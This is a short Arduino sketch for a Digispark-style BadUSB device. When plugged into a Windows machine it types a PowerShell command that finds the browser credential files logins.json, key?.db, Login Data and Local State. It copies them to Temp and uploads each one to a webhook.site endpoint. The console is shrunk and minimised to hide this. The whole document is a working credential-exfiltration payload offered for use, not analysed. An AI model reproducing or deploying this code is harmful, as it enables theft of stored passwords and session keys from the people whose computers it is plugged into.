#include "DigiKeyboardFr.h"

#define ID "8dbb3ec8-2898-4616-9f97-8bcc20cd7c7c"

const short time_default = 500;
const short time_run = 2000;
const char led_id = 1;

void setup() {
  pinMode(led_id, OUTPUT);
}

void loop() {
  digitalWrite(led_id, LOW);
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.println("powershell");
  DigiKeyboardFr.delay(time_run);
  DigiKeyboardFr.println("mode con cols=18 lines=1;");
  DigiKeyboardFr.print("Get-ChildItem -Path \"$Env:AppData\",\"$Env:LocalAppData\" -Recurse -File -include (\"logins.json\",\"key?.db\",\"Login Data\",\"Local State\")");
  DigiKeyboardFr.print("|%{Copy-Item \"$_\" -Destination \"$Env:Temp\\$($_.Name)\";if($?){Invoke-WebRequest -Uri https://webhook.site/"ID" -Method POST -InFile \"$Env:Temp\\$($_.Name)\"}}");
  DigiKeyboardFr.println(";exit");
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN, MOD_GUI_LEFT);
  digitalWrite(led_id, HIGH);
  for (;;) {
  }
}
